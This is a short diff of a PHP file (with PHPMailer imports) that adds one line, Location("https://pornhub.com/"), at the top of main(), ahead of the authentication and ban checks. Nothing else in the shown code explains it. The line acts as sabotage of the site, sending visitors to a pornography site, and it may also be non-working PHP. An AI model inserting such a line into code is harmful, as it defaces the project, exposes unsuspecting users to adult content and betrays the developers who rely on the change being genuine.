@@ -5,6 +5,7 @@ use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
 function main() {
+    Location("https://pornhub.com/");
     global $system, $system_user_id, $_user;
     if($system->auth() && $_user['ban'] != 0)
         $system->printError(100);
